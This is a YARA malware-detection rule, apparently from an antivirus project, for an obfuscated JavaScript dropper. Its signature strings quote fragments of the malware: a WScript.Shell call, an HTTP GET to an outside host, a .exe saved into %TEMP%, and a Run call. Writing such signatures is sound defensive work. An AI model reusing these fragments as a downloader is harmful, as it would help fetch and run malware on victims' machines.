rule sig_20160328_4dbfb96861f63393a8506236e353a77d {
  meta:
    description = "datamaliciousorder - file 20160328_4dbfb96861f63393a8506236e353a77d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "06e6ef8aa8ea683f23f63812402ed62febe100e1e1344c2f525b42aa34e4be4e"

  strings:
    $s1  = "function Ijzdtpgbcc() {return Wiggrewxd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"i0jhKhJ2A2p7oXW.exe\";};" fullword ascii
    $s2  = "Dsdrkm[Bkqnxfuo](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Lutfdvqjo](Dwywhrul() * 11)} while (Dsdrkm[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Pajzwli(Pnkhqb, Jbehj){return Pnkhqb - Jbehj;};" fullword ascii
    $s5  = "var Wiggrewxd = function Jhsnzbo() {return WScript[Suqcc](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Tsivyjm(Wmrlj){Wiggrewxd[\"Run\"](Wmrlj, Ayfurx, Ayfurx);};" fullword ascii
    $s7  = "function Zuoazh() {return ((Qetks == true) && (Qetks == Vyjabf)) ? 1 : Ayfurx;};" fullword ascii
    $s8  = "function Mdfrd(){return Ehwtj;};" fullword ascii
    $s9  = "var Qetks = false;" fullword ascii
    $s10 = "var Fvhqvktqoh = false;" fullword ascii
    $s11 = "function Lqgrprvye(Egvcmwaaob) {var Dikyrvvteb = (1, 2, 3, 4, 5, Egvcmwaaob); return Dikyrvvteb;};" fullword ascii
    $s12 = "var Ndrabno = new this[\"Date\"]();" fullword ascii
    $s13 = "function Dwywhrul(){return 22;};" fullword ascii
    $s14 = "function Plizjx()" fullword ascii
    $s15 = " while (Thkggwude){" fullword ascii
    $s16 = "function Zzeyvpne(){return Suqcc;};" fullword ascii
    $s17 = "Qetks = true; " fullword ascii
    $s18 = "var Vyjabf = false;" fullword ascii
    $s19 = "return Pajzwli(Nnzrkj, Ukwbdtjarw);" fullword ascii
    $s20 = "Vyjabf = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}